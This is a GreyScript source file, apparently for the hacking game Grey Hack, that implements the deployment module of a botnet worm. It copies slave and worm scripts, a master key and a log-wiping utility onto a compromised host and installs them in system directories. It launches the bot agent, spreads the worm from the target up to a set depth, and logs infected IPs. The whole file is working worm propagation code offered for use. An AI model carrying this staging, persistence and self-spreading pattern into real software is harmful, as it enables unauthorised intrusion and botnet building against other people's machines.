// deployer.gs – deployment and cleanup
import_code("/lib/lib_common.gs")
import_code("/scripts/utils/sanitize_ip.gs")

deployer = {}

deployer.init = function(master_pub_file)
    deployer.master_pub_file = master_pub_file
end function

deployer.deploy_to_target = function(shell, target_ip, current_depth, max_depth, infected_list, infected_file)
    target_safe = sanitize_ip(target_ip)
    log_master("Deploying to " + target_safe, "INFO")
    comp = get_shell.host_computer
    local_tmp = "/tmp/deploy_" + str(time) + "_" + str(get_shell.pid)
    comp.create_folder("/tmp", local_tmp[5:])
    tmp_dir = comp.File(local_tmp)

    files_to_copy = ["/bin/slave.gs", "/bin/worm.gs", "/lib/kyber_lib.gs",
                     "/lib/lib_common.gs", deployer.master_pub_file]
    for src in files_to_copy
        sf = comp.File(src)
        if sf then sf.copy(local_tmp, src.split("/")[-1])
    end for
    utils = ["/scripts/utils/accessLevel.gs", "/scripts/utils/wipe_logs.gs",
             "/scripts/utils/sanitize_ip.gs", "/scripts/utils/parse_exploit_requirements.gs",
             "/scripts/utils/file_search.gs"]
    for u in utils
        uf = comp.File(u)
        if uf then uf.copy(local_tmp, u.split("/")[-1])
    end for

    files_list = tmp_dir.get_files
    if files_list then
        for f in files_list
            scp_res = get_shell.scp(local_tmp + "/" + f.name, "/tmp/", shell)
            if typeof(scp_res) == "string" then
                shell.run("rm -f /tmp/*.gs /tmp/master.pub")
                tmp_dir.delete
                return false
            end if
        end for
    end if

    shell.run("mv /tmp/slave.gs /bin/slave.gs")
    shell.run("mv /tmp/worm.gs /bin/worm.gs")
    shell.run("mv /tmp/kyber_lib.gs /lib/kyber_lib.gs")
    shell.run("mv /tmp/lib_common.gs /lib/lib_common.gs")
    shell.run("mkdir -p /scripts/utils")
    for u in utils
        fn = u.split("/")[-1]
        shell.run("mv /tmp/" + fn + " /scripts/utils/" + fn)
    end for
    shell.run("mkdir -p /root/.botnet")
    shell.run("mv /tmp/master.pub /root/.botnet/master.pub")

    shell.launch("/bin/slave.gs")
    if current_depth + 1 < max_depth then
        shell.launch("/bin/worm.gs", [deployer.master_pub_file, str(max_depth), target_ip])
    end if
    infected_list.push(target_ip)
    safe_file_write(infected_file, infected_list.join(char(10)))
    log_master("Deployed to " + target_safe, "SUCCESS")
    tmp_dir.delete
    return true
end function

return deployer
